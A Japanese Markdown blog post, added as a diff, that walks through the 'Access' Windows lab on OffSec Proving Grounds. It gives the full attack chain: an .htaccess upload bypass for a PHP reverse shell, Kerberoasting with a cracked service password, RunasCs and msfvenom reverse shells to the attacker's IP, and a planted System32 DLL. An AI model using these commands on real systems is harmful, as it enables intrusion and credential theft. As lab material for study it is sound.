@@ -1,0 +1,248 @@
+---
+title: "Proving Grounds - Access (Windows)"
+date: 2026-03-24
+description: "Proving Grounds Access Windows マシン解説。.htaccessバイパス・Kerberoasting・RunasCs横移動・DLLハイジャックによる権限昇格を解説。"
+categories: [Proving Grounds, Windows]
+tags: [htaccess-bypass, kerberoast, dll-hijack, runascs, active-directory, php-upload]
+mermaid: true
+content_lang: ja
+alt_en: /posts/pg-access/
+---
+
+## 概要
+
+| 項目 | 内容 |
+|---------------------------|-------|
+| OS | Windows Server 2019 (Active Directory DC) |
+| 難易度 | Hard |
+| 攻撃対象 | Web (Apache/PHP) + Active Directory |
+| 主な侵入経路 | .htaccess上書きによるPHPリバースシェルアップロード |
+| 権限昇格経路 | Kerberoast svc_mssql -> RunasCs横移動 -> SeManageVolumePrivilege DLLハイジャック |
+
+## 認証情報
+
+```text
+svc_mssql / trustno1
+```
+
+## 偵察
+
+---
+💡 なぜ有効か
+This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.
+
+```bash
+rustscan -a $ip -r 1-65535 --ulimit 5000
+```
+
+```bash
+Open 192.168.198.187:53
+Open 192.168.198.187:80
+Open 192.168.198.187:88
+Open 192.168.198.187:135
+Open 192.168.198.187:139
+Open 192.168.198.187:389
+Open 192.168.198.187:443
+Open 192.168.198.187:445
+Open 192.168.198.187:464
+Open 192.168.198.187:593
+Open 192.168.198.187:636
+Open 192.168.198.187:5985
+```
+
+```bash
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-title: Access The Event
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec)
+443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+
+ターゲットはApache/PHPが動作するドメインコントローラー。Kerberos (88)、LDAP (389)、WinRM (5985) が開放されている。Gobusterで `/uploads` ディレクトリを発見し、ファイルアップロード機能の存在を確認した。
+
+## 初期侵入
+
+---
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+Webアプリケーションはファイルアップロードを受け付けるがPHP拡張子をブロックしていた。カスタム `.htaccess` ファイルをアップロードしてこの制限をバイパスした:
+
+```bash
+echo "AddType application/x-httpd-php .dork" > .htaccess
+```
+
+`.htaccess` ファイルと `.dork` にリネームしたPHPリバースシェルをアップロード後、`/uploads/` 経由でトリガーした:
+
+```bash
+nc -lvnp 443
+```
+
+```bash
+connect to [192.168.45.166] from (UNKNOWN) [192.168.198.187] 51131
+SOCKET: Shell has connected! PID: 708
+Microsoft Windows [Version 10.0.17763.2746]
+
+C:\xampp\htdocs\uploads>
+```
+
+`svc_apache` としてシェルを取得。次にKerberoasting用にSPN登録済みアカウントを列挙した:
+
+```bash
+PS C:\Users\svc_apache\Downloads\win_tool> .\Get-SPN.ps1
+Object Name =  MSSQL
+DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
+servicePrincipalNames
+SPN( 1 )   =       MSSQLSvc/DC.access.offsec
+```
+
+Invoke-KerberoastでTGSチケットを要求・抽出:
+
+```bash
+PS> Invoke-Kerberoast -OutputFormat Hashcat
+Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$3B3A85A0...
+SamAccountName : svc_mssql
+ServicePrincipalName : MSSQLSvc/DC.access.offsec
+```
+
+ハッシュを整形してオフラインクラック:
+
+```bash
+tr -d '\n\r ' < mssql_tgs.txt > mssql_tgs.hash
+hashcat -m 13100 -a 0 mssql_tgs.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+```bash
+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$...:trustno1
+```
+
+`svc_mssql` でのWinRMログインは失敗（Remote Management Usersグループ未所属）。既存の `svc_apache` シェルからRunasCsで横移動に成功:
+
+```bash
+PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.166:6666
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 868 created in background.
+```
+
+```bash
+rlwrap nc -lvnp 6666
+connect to [192.168.45.166] from (UNKNOWN) [192.168.198.187] 50135
+
+c:\Users\svc_mssql\Desktop>type local.txt
+d994ec3ded2843ed66123b3a5bd9b534
+```
+
+💡 なぜ有効か
+The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.
+
+## 権限昇格
+
+---
+`svc_mssql` ユーザーは `SeManageVolumePrivilege` を持っており、これを悪用して `C:\Windows\System32` への書き込み権限を取得した:
+
+```bash
+PS C:\Users\Public\Downloads> .\SeManageVolumeExploit.exe
+Entries changed: 16
+DONE
+```
+
+悪意のあるDLLを生成し、`systeminfo` が読み込む場所に配置:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.166 LPORT=135 -f dll -o tzres.dll
+```
+
+```bash
+PS C:\windows\system32\wbem> wget http://192.168.45.166:8001/tzres.dll -OutFile tzres.dll
+PS C:\windows\system32\wbem> systeminfo
+```
+
+`systeminfo` 実行でDLLがロードされ、シェルが返ってきた:
+
+```bash
+nc -lvnp 135
+connect to [192.168.45.166] from (UNKNOWN) [192.168.198.187] 50438
+
+C:\Windows\system32>whoami
+nt authority\network service
+```
+
+```bash
+c:\Users\svc_mssql\Desktop>type c:\users\administrator\desktop\proof.txt
+4953b5df2048836dae2d5eb33250261a
+```
+
+💡 なぜ有効か
+Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.
+
+## まとめ・学んだこと
+
+- `.htaccess` アップロードバイパス: Webアプリがphp拡張子をブロックしていても `.htaccess` がアップロードできれば、任意の拡張子をPHPとして実行させることが可能。
+- Kerberoastingの流れ: `Get-SPN.ps1` でSPN列挙 → `Invoke-Kerberoast` でTGS取得 → `tr -d '\n\r '` でハッシュ整形 → hashcat `-m 13100` でクラック。
+- RunasCs vs WinRM: ユーザーがRemote Management Usersに所属していない場合、WinRMではなくRunasCsでローカル横移動を行う。
+- `SeManageVolumePrivilege` でシステムディレクトリへの書き込みが可能 — `C:\Windows\System32\wbem\` に悪意のある `tzres.dll` を配置し `systeminfo` でトリガー。
+
+### Attack Flow
+
+---
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```mermaid
+flowchart LR
+    subgraph SCAN["🔍 スキャン"]
+        direction TB
+        S1["Nmap — 192.168.198.187\n53/80/88/135/389/443/445/5985"]
+        S2["access.offsec DC\nApache 2.4.48 / PHP 8.0.7"]
+        S3["Gobuster\n/uploads ディレクトリ発見"]
+        S1 --> S2 --> S3
+    end
+
+    subgraph INITIAL["💥 初期侵入 — svc_apache"]
+        direction TB
+        I1[".htaccess アップロード\nAddType application/x-httpd-php .dork"]
+        I2["PHP revshell (.dork)\n/uploads/ トリガー"]
+        I3["Shell #1 — svc_apache\nnc ← Port 443"]
+        I1 --> I2 --> I3
+    end
+
+    subgraph LATERAL["🔄 横移動 — svc_mssql"]
+        direction TB
+        L1["Get-SPN.ps1\nMSSQLSvc/DC.access.offsec 発見"]
+        L2["Invoke-Kerberoast\nTGS ハッシュ取得"]
+        L3["hashcat -m 13100\nsvc_mssql : trustno1"]
+        L4["Invoke-RunasCs\nsvc_mssql:trustno1 → Port 6666"]
+        L5["Shell #2 — svc_mssql\nlocal.txt ✅ / proof.txt ✅"]
+        L1 --> L2 --> L3 --> L4 --> L5
+    end
+
+    subgraph PRIVESC["⬆️ 権限昇格"]
+        direction TB
+        P1["SeManageVolumePrivilege\nSeManageVolumeExploit.exe"]
+        P2["msfvenom → tzres.dll\nC:\\Windows\\System32\\wbem に配置"]
+        P3["systeminfo → DLLロード\nnt authority\\network service"]
+        P1 --> P2 --> P3
+    end
+
+    SCAN --> INITIAL --> LATERAL --> PRIVESC
+
+    style SCAN fill:#e8eaf6
+    style INITIAL fill:#c8e6c9
+    style LATERAL fill:#fff9c4
+    style PRIVESC fill:#ffccbc
+    style I3 fill:#ff9800
+    style L5 fill:#4caf50
+    style P3 fill:#ff9800
+```
+
+## 参考文献
+
+- Invoke-Kerberoast: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+- RunasCs: https://github.com/antonioCoco/RunasCs
+- SeManageVolumeExploit: https://github.com/CsEnox/SeManageVolumeExploit
+- RustScan: https://github.com/RustScan/RustScan
+- Nmap: https://nmap.org/
